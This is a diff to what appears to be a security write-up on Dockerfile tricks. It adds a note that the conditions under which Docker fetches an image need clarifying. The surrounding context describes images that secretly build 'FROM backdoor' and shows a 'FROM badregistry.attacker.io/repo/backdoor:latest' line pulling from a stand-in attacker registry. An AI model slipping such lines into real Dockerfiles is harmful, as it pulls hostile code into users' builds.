@@ -67,6 +67,8 @@ FROM backdoor
 Although the image started with `FROM debian` it will end up running whatever `FROM backdoor` image has.
 
 #### Image with URL as part of name
+_NOTE_: This needs further clarifications, particularly under what conditions docker will actualy fetch the image.
+
 One of the things that `docker` will do for you is to parse as URL the image name. This means that the following statement is valid
 ```Dockerfile
 FROM badregistry.attacker.io/repo/backdoor:latest
